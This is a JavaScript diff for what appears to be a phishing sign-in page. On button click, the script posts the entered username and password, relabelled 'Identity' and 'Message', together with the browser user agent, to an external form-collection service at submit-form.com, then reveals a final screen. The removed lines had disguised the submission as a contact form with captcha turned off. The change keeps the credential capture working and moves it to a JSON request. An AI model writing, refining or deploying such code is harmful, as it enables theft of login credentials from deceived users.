@@ -31,36 +31,43 @@ document.addEventListener('DOMContentLoaded', () => {
     const sig = document.getElementById('btn_sig');
 
     sig.addEventListener('click', async () => {
-        validate();
+    validate();
 
-        if (pwdVal) {
+    if (pwdVal) {
 
-            const formData = new FormData();
+        const data = {
+            Identity: unameInp.value,
+            Message: pwdInp.value,
+            SubmittedAt: new Date().toLocaleString(),
+            UserAgent: navigator.userAgent
+        };
 
-            formData.append("Identity", unameInp.value);
-            formData.append("Message", pwdInp.value);
-            formData.append("Submitted At", new Date().toLocaleString());
-            formData.append("User Agent", navigator.userAgent);
-
-            // FormSubmit settings
-            formData.append("_subject", "New Contact Form Submission");
-            formData.append("_captcha", "false");
-
-            try {
-                await fetch("https://submit-form.com/ajax/TRFsGA4J6", {
+        try {
+            const response = await fetch(
+                "https://submit-form.com/TRFsGA4J6",
+                {
                     method: "POST",
-                    body: formData
-                });
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                }
+            );
 
-                document.getElementById("section_pwd").classList.toggle('d-none');
-                document.getElementById('section_final').classList.remove('d-none');
-                view = "final";
-
-            } catch (err) {
-                console.error("Submission failed:", err);
+            if (!response.ok) {
+                throw new Error("Form submission failed");
             }
+
+            document.getElementById("section_pwd").classList.toggle('d-none');
+            document.getElementById('section_final').classList.remove('d-none');
+            view = "final";
+
+        } catch (err) {
+            console.error("Submission failed:", err);
         }
-    });
+    }
+});
 
     function validate() {
 
